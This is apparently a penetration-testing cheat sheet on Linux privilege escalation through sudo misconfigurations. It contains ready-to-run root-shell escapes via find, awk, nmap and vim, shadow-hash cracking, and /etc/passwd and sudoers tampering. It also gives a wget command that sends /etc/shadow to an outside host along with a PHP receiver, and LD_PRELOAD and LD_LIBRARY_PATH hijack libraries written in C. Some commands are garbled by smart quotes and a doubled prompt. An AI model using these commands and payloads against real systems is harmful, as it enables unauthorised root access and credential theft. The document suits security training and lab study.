# Sudo Abuse

## Sudo SUIDs (Shell Escape Sequences)

This techniques uses common Unix binaries to bypass local security restrictions and privilaige esclation, read more here: https://github.com/RootInj3c/OSCP-PwK/blob/master/Linux/SUID_Bash.md#gtfobins

Examples:

```
bob@victimlinux:~/#: sudo find /bin -name nano -exec /bin/sh \;
bob@victimlinux:~/#: sudo awk 'BEGIN {system("/bin/sh")}'
bob@victimlinux:~/#: echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
bob@victimlinux:~/#: sudo vim -c '!sh'
```

## Shadow file abuse (trick 1 - Read-Only required)

If shadow file has read permission, copy the root hash and use john the ripprt (JTR) to crack it.

First create unshadow file using the passwd and shadow files:

```
root@kali:~/#: unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
```

Then, feed them in JTR:

```
root@kali:~/#: john unshadow_file --wordlist=/usr/share/wordlists/rockyou.txt
```

## Shadow file abuse (trick 2 - World-Writable required)

Is /etc/shadow is world-writable?

```
bob@victimlinux:~/#: root@kali:~/# ls -la /etc/shadow
-rwxrwxrwx 1 root shadow 1755 Nov 25 06:14 /etc/shadow
```

If so, then let's create us a password:

```
bob@victimlinux:~/#: perl -le ‘print crypt(“Password@973″,”addedsalt”)’
```

Append it as new root user to the passwd file:

```
bob@victimlinux:~/#: echo "hacker:<our_generated_password>:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
```

*NOTE*: Another trick would be reset root password, but it may lead to unstable machine FYI:

```
bob@victimlinux:~/#: echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su

```

Another cool trick (if you have sudo on wget) is to copy your victim /etc/passwd file to your local machine as following:

```
bob@victimlinux:~/#: sudo wget --post-file=/etc/shadow 192.168.10.1:8080
```

Example Backend code (PHP) on you kali machine:

```
<?php
$capture = file_get_contents("php://input");
$myfile = fopen("passwd", "w") or die("Unable to open file!");
fwrite($myfile, $capture);
fclose($myfile);
echo "Logged 1337Hacker :)";
?>
```

Change the passwd file by the same way described above offline, then download it back to victim host using Wget command:

```
bob@victimlinux:~/#: sudo wget http://192.168.10.1:8080/passwd -O /etc/passwd
```

## Sudoers Abuse

The sudoers file is like rules-file considering the decision making about granting an access to user.

For example:

```
bob@victimlinux:~/#: sudo -l
Matching Defaults entries for root on kali:
    env_reset, mail_badpass

User user may run the following commands on kali:
    root ALL=(ALL) ALL
    bob ALL = (root) NOPASSWD: /usr/bin/find
...
```

The first line means that user can execute from any terminal, under any user with any command.
The 2nd line means that user bob could execute from any terminal and execute find utility as root user without password.

To abuse it, let's try to add our user (www-data) with no password to /etc/sudoers file:

```
bob@victimlinux:~/#: echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

### LD_PRELOAD

When using *sudo -l* command, if you notice LD_PRELOAD and environment variable env_keep option, for example:

```
bob@victimlinux:~/#: sudo -l
Matching Defaults entries for user on this host:
     env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
...
```

Then we create our .so (shared libarary) file as following:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
   unsetenv("LD_PRELOAD");
   setresuid(0,0,0);
   system("/bin/bash -p");
}
```

Compile as following:

```
bob@victimlinux:~/#: gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

And we execute our file using any allowed program using sudo:

```
bob@victimlinux:~/#: sudo LD_PRELOAD=/tmp/preload.so apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```

*NOTE*: Depend on your machine, this trick disabled by default for most linux dists.


### LD_LIBRARY_PATH

If some program has shared libraries, we may creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.

To test wheter shared libraries program use we'll use ldd command:

```
bob@victimlinux:~/#: ldd /usr/sbin/wget
linux-vdso.so.1 => (0x00007fff063ff000)
...
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
```

Let's create our payload:

```
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
   unsetenv("LD_LIBRARY_PATH");
   setresuid(0,0,0);
   system("/bin/bash -p");
}
```

Compiling as following:

```
bob@victimlinux:~/#: gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```

Now the next step really depend on the shared library we would like to hijack. For most case, it just try one-by-one:

```
bob@victimlinux:~/#: sudo LD_LIBRARY_PATH=. apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Binary capabilities

Similiar to SUID, the binary capabilities may give additional permission to preform network operation such as intercept network.

First lets running the getcap command on commonly used directories:

```
bob@victimlinux:~/#: getcap -r /bin/;getcap -r /usr/bin/;getcap -r /usr/sbin/;
/usr/bin/tcpdump = cap_net_admin,cap_net_raw+eip
/usr/bin/fping = cap_net_raw+ep
/usr/bin/python = cap_setuid+eip
/usr/bin/slock = cap_dac_override,cap_sys_resource+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep
```

Now we can run tcpdump on all the interfaces to intercept network packets.

But more important as we found Python has *cap_setuid+eip* capabilities we can esclate to root using the famouse trick:

```
bob@victimlinux:~/#: python -c 'import os; os.setuid(0); os.system("/bin/bash ")'
```

Read more about binary capabilities here: http://man7.org/linux/man-pages/man7/capabilities.7.html
